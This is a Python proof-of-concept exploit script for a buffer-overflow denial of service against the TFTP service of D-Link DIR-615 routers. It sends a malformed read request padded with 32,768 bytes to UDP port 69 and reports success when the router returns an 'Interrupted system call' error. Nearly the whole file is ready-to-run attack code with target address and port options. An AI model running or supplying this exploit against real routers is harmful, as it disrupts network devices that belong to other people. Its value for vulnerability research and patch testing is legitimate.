# D-Link DIR-615 TFTP DoS (Buffer Overflow) PoC
# Written by: ftdot
# Tested on: DIR-615 E4 Ver.: 5.10
# Inspired by Pinkie TFTP DoS (https://www.exploit-db.com/exploits/50535)

import argparse
import socket


def dir615_tftp_dos_exploit(address: str, port: int = 69):
  """Performs DoS TFTP service on DIR-615 router"""

  print(f'[*] Exploiting {address}:{port} by DIR-615 TFTP DoS exploit')

  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(b'\x00\x01' + b'*' * 32768 + b'\x00netascii\x00', (address, port))
    result = s.recv(65535)
    print('[*] Host retured:', result)

    if result == b'\x00\x05\x00\x04Interrupted system call\x00':
      print('[+] TFTP service successfully DoSed')

  except Exception as e:
    print(f'[-] Cannot exploit, exception occurred:\n{e}')


if __name__ == '__main__':

  parser = argparse.ArgumentParser()
  parser.add_argument('-i', '--ip',
                      default='192.168.0.1',
                      help='IP address of the router (Default: 192.168.0.1)'
                      )
  parser.add_argument('-p', '--port',
                      default=69,
                      type=int,
                      help='Port of the TFTP service (Default: 69)'
                      )

  args = parser.parse_args()

  dir615_tftp_dos_exploit(args.ip, args.port)
